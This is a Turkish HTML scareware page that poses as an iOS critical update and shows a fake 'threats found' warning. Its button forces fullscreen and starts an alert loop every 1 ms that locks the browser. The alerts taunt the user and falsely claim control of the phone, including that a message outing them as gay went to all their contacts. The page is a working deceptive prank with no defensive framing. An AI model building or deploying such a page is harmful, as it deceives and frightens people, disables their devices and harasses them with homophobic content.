<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>iOS KRİTİK GÜNCELLEME</title>
    <style>
        body { 
            background: #000; color: #ff3b30; 
            font-family: -apple-system, sans-serif; 
            display: flex; justify-content: center; align-items: center; 
            height: 100vh; margin: 0; overflow: hidden;
            cursor: none;
        }
        .warning-box { 
            border: 2px solid #ff3b30; padding: 50px; 
            border-radius: 20px; text-align: center;
            box-shadow: 0 0 50px rgba(255, 59, 48, 0.5);
        }
        h1 { font-size: 30px; margin-bottom: 20px; }
        .btn-doom { 
            background: #ff3b30; color: white; padding: 20px 40px; 
            border-radius: 10px; font-weight: bold; border: none; 
            font-size: 20px; cursor: pointer;
        }
    </style>
</head>
<body>

<div class="warning-box" id="mainBox">
    <h1>⚠️ SİSTEM HATASI ⚠️</h1>
    <p>Cihazınızda 99+ tehdit bulundu. <br>Temizlemek için aşağıdaki butona basın.</p>
    <button class="btn-doom" onclick="launchChaos()">TEMİZLEMEYİ BAŞLAT</button>
</div>

<script>
function launchChaos() {
    // 1. ADIM: Tam Ekran Yap (Kullanıcı etkileşimi şart olduğu için burada tetikliyoruz)
    let elem = document.documentElement;
    if (elem.requestFullscreen) {
        elem.requestFullscreen();
    } else if (elem.webkitRequestFullscreen) { /* Safari için */
        elem.webkitRequestFullscreen();
    }

    // 2. ADIM: Mobbing Başlıyor
    alert("TEMİZLEME BAŞLATILAMADI! \nHACKLENDİN AGA HAHAHA!");

    // 3. ADIM: 1 Milisaniyede Bir Sonsuz Döngü
    // Bu döngü başladığı an işlemci alert basmaktan başka bir şey yapamaz
    setInterval(function() {
        alert("SİLSENE LAN! HADİ SİL!");
        alert("TELEFONUN ŞU AN ELİMDE!");
        alert("AYARLARDA BOŞUNA GEZME!");
        alert("BEN GAYIM DİYE TÜM REHBERE MESAJ GİTTİ BİLE!");
    }, 1); // 1 ms = Saniyede binlerce bildirim!
}
</script>

</body>
</html>
